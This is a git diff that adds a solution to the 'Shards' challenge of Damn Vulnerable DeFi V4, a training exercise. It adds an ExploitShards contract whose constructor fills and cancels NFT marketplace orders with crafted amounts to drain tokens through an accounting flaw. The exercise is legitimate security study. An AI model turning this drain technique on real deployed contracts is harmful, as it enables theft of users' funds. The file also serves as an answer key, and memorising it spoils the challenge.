@@ -115,6 +115,8 @@ contract ShardsChallenge is Test {
      */
     function test_shards() public checkSolvedByPlayer {
         
+        // Ref: https://github.com/PitrikYan/DamnVulnerableDefi-V4/blob/main/test/shards/Shards.t.sol
+        new ExploitShards(token, marketplace, recovery);
     }
 
     /**
@@ -134,5 +136,19 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+
+contract ExploitShards{
+    constructor(DamnValuableToken token, ShardsNFTMarketplace marketplace, address recovery){
+        token.approve(address(marketplace), 1 ether);
+        uint256 purchaseIndex = marketplace.fill(1, 100);
+        marketplace.cancel(1, purchaseIndex);
+
+        purchaseIndex = marketplace.fill(1, 9999999900);
+        marketplace.cancel(1, purchaseIndex);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
